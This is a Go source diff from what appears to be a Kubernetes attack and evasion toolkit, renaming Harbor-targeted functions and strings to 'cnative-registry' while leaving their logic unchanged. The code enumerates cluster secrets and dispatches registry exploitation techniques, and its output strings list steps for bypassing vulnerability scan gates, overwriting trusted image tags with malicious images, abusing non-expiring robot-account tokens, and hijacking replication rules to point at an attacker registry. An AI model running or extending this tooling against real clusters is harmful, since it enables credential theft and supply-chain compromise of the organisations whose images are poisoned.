@@ -10,7 +10,7 @@ import (
 	"k8s.io/client-go/kubernetes"
 )
 
-func detectHarbor(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
+func detectCnativeRegistry(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
 	namespaces := []string{"harbor", "harbor-system", "default"}
 	for _, ns := range namespaces {
 		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
@@ -18,10 +18,10 @@ func detectHarbor(ctx context.Context, client kubernetes.Interface) []DetectionS
 		})
 		if err == nil && len(pods.Items) > 0 {
 			return []DetectionSystem{{
-				Name:      "harbor",
+				Name:      "cnative-registry",
 				Detected:  true,
 				Namespace: ns,
-				Details:   fmt.Sprintf("%d harbor pods", len(pods.Items)),
+				Details:   fmt.Sprintf("%d cnative-registry pods", len(pods.Items)),
 			}}
 		}
 
@@ -30,7 +30,7 @@ func detectHarbor(ctx context.Context, client kubernetes.Interface) []DetectionS
 		})
 		if err == nil && len(pods.Items) > 0 {
 			return []DetectionSystem{{
-				Name:      "harbor",
+				Name:      "cnative-registry",
 				Detected:  true,
 				Namespace: ns,
 				Details:   fmt.Sprintf("harbor-core in %s", ns),
@@ -43,10 +43,10 @@ func detectHarbor(ctx context.Context, client kubernetes.Interface) []DetectionS
 		for _, svc := range services.Items {
 			if strings.Contains(svc.Name, "harbor-core") || strings.Contains(svc.Name, "harbor-registry") {
 				return []DetectionSystem{{
-					Name:      "harbor",
+					Name:      "cnative-registry",
 					Detected:  true,
 					Namespace: svc.Namespace,
-					Details:   fmt.Sprintf("harbor service: %s", svc.Name),
+					Details:   fmt.Sprintf("cnative-registry service: %s", svc.Name),
 				}}
 			}
 		}
@@ -55,26 +55,26 @@ func detectHarbor(ctx context.Context, client kubernetes.Interface) []DetectionS
 	return nil
 }
 
-// ExploitHarbor executes the specified Harbor registry exploitation technique.
-func ExploitHarbor(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
+// ExploitCnativeRegistry executes the specified cnative-registry exploitation technique.
+func ExploitCnativeRegistry(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
 	_ = dynClient
 	switch technique {
 	case "enumerate":
-		return harborEnumerate(ctx, client)
+		return cnativeRegistryEnumerate(ctx, client)
 	case "bypass_scan":
-		return harborBypassScan(ctx, client)
+		return cnativeRegistryBypassScan(ctx, client)
 	case "robot_exploit":
-		return harborRobotExploit(ctx, client)
+		return cnativeRegistryRobotExploit(ctx, client)
 	case "replication_hijack":
-		return harborReplicationHijack(ctx, client)
+		return cnativeRegistryReplicationHijack(ctx, client)
 	default:
-		return harborEnumerate(ctx, client)
+		return cnativeRegistryEnumerate(ctx, client)
 	}
 }
 
-func harborEnumerate(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
+func cnativeRegistryEnumerate(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Harbor Registry Enumeration:\n\n")
+	sb.WriteString("cnative-registry Enumeration:\n\n")
 
 	namespaces := []string{"harbor", "harbor-system", "default"}
 	found := false
@@ -105,23 +105,23 @@ func harborEnumerate(ctx context.Context, client kubernetes.Interface) (*Evasion
 
 	secrets, err := client.CoreV1().Secrets("").List(ctx, metav1.ListOptions{})
 	if err == nil {
-		harborSecrets := 0
+		cnativeRegistrySecrets := 0
 		for _, s := range secrets.Items {
 			if strings.Contains(s.Name, "harbor") {
-				harborSecrets++
-				if harborSecrets <= 10 {
+				cnativeRegistrySecrets++
+				if cnativeRegistrySecrets <= 10 {
 					fmt.Fprintf(&sb, "  Secret: %s/%s type=%s\n", s.Namespace, s.Name, s.Type)
 				}
 			}
 		}
-		if harborSecrets > 10 {
-			fmt.Fprintf(&sb, "  ... and %d more harbor secrets\n", harborSecrets-10)
+		if cnativeRegistrySecrets > 10 {
+			fmt.Fprintf(&sb, "  ... and %d more cnative-registry secrets\n", cnativeRegistrySecrets-10)
 		}
 	}
 
 	if !found {
-		sb.WriteString("  No Harbor components detected in-cluster\n")
-		sb.WriteString("  Harbor may be external — check imagePullSecrets for registry URLs\n")
+		sb.WriteString("  No cnative-registry components detected in-cluster\n")
+		sb.WriteString("  cnative-registry may be external — check imagePullSecrets for registry URLs\n")
 	}
 
 	return &EvasionResult{
@@ -131,11 +131,11 @@ func harborEnumerate(ctx context.Context, client kubernetes.Interface) (*Evasion
 	}, nil
 }
 
-func harborBypassScan(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
+func cnativeRegistryBypassScan(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Harbor Scan Gate Bypass:\n\n")
+	sb.WriteString("cnative-registry Scan Gate Bypass:\n\n")
 
-	sb.WriteString("  Harbor can block image pulls until vulnerability scan passes.\n")
+	sb.WriteString("  cnative-registry can block image pulls until vulnerability scan passes.\n")
 	sb.WriteString("  Bypassing the scan gate allows deploying unscanned images.\n\n")
 
 	namespaces := []string{"harbor", "harbor-system"}
@@ -165,7 +165,7 @@ func harborBypassScan(ctx context.Context, client kubernetes.Interface) (*Evasio
 	sb.WriteString("    2. Use image tag that was previously scanned, then overwrite with new layers\n")
 	sb.WriteString("    3. Push to project without scan-on-push policy\n")
 	sb.WriteString("    4. Exploit scan timeout — large images may skip scan on timeout\n")
-	sb.WriteString("    5. Use cosign/notation to pre-sign image (may skip scan if signed)\n")
+	sb.WriteString("    5. Use cnative-signing/notation to pre-sign image (may skip scan if signed)\n")
 	sb.WriteString("    6. Pull from external registry via proxy cache (bypasses local scan)\n")
 	sb.WriteString("    7. Modify project configuration to disable prevent-vulnerable policy\n")
 
@@ -176,9 +176,9 @@ func harborBypassScan(ctx context.Context, client kubernetes.Interface) (*Evasio
 	}, nil
 }
 
-func harborRobotExploit(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
+func cnativeRegistryRobotExploit(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Harbor Robot Account Exploitation:\n\n")
+	sb.WriteString("cnative-registry Robot Account Exploitation:\n\n")
 
 	sb.WriteString("  Robot accounts provide registry push/pull credentials.\n")
 	sb.WriteString("  These are often stored as Kubernetes secrets (dockerconfigjson).\n\n")
@@ -222,7 +222,7 @@ func harborRobotExploit(ctx context.Context, client kubernetes.Interface) (*Evas
 	sb.WriteString("    2. Robot accounts with push access can overwrite existing images\n")
 	sb.WriteString("    3. Push malicious image with same tag as trusted image\n")
 	sb.WriteString("    4. Robot tokens often have no expiry — permanent access\n")
-	sb.WriteString("    5. Create new robot account via Harbor API if admin creds found\n")
+	sb.WriteString("    5. Create new robot account via cnative-registry API if admin creds found\n")
 
 	return &EvasionResult{
 		Technique: "robot_exploit",
@@ -231,11 +231,11 @@ func harborRobotExploit(ctx context.Context, client kubernetes.Interface) (*Evas
 	}, nil
 }
 
-func harborReplicationHijack(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
+func cnativeRegistryReplicationHijack(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Harbor Replication Rule Hijack:\n\n")
+	sb.WriteString("cnative-registry Replication Rule Hijack:\n\n")
 
-	sb.WriteString("  Harbor replication syncs images between registries.\n")
+	sb.WriteString("  cnative-registry replication syncs images between registries.\n")
 	sb.WriteString("  Modifying replication rules can redirect image pulls to attacker registry.\n\n")
 
 	namespaces := []string{"harbor", "harbor-system"}
